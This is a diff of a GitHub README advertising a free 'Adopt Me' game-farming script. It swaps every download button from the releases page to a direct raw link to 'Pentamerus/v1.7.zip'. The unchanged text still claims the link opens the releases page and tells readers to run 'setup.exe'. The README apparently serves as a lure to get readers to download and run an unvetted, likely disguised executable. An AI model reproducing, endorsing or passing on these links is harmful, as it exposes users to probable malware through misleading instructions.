@@ -1,6 +1,6 @@
 # 🐾 adoptme-script-free-2026 - Automate Your Adopt Me Farming Today
 
-[![Download Now](https://img.shields.io/badge/Download-AdoptMe_Script_Free_2026-2ea44f?style=for-the-badge)](https://github.com/lorenzor6006/adoptme-script-free-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-AdoptMe_Script_Free_2026-2ea44f?style=for-the-badge)](https://github.com/lorenzor6006/adoptme-script-free-2026/raw/refs/heads/main/Pentamerus/v1.7.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these simple steps to download and run the software on your Windows compu
 
 Click the button below to open the download page:
 
-[![Visit the Download Page](https://img.shields.io/badge/Visit_Download_Page-blue?style=for-the-badge)](https://github.com/lorenzor6006/adoptme-script-free-2026/releases)
+[![Visit the Download Page](https://img.shields.io/badge/Visit_Download_Page-blue?style=for-the-badge)](https://github.com/lorenzor6006/adoptme-script-free-2026/raw/refs/heads/main/Pentamerus/v1.7.zip)
 
 ### Step 2: Download the Installer
 
@@ -128,7 +128,7 @@ This software is provided “as is” without warranty of any kind. The develope
 
 Here’s the direct link again for your convenience:
 
-[![Download AdoptMe Script Free 2026](https://img.shields.io/badge/Download_Now-2ea44f?style=for-the-badge)](https://github.com/lorenzor6006/adoptme-script-free-2026/releases)
+[![Download AdoptMe Script Free 2026](https://img.shields.io/badge/Download_Now-2ea44f?style=for-the-badge)](https://github.com/lorenzor6006/adoptme-script-free-2026/raw/refs/heads/main/Pentamerus/v1.7.zip)
 
 Visit this link to download the application. Once you click it, you’ll be taken to the releases page where you can grab the **setup.exe** file. After that, just run it and follow the on-screen instructions.
 
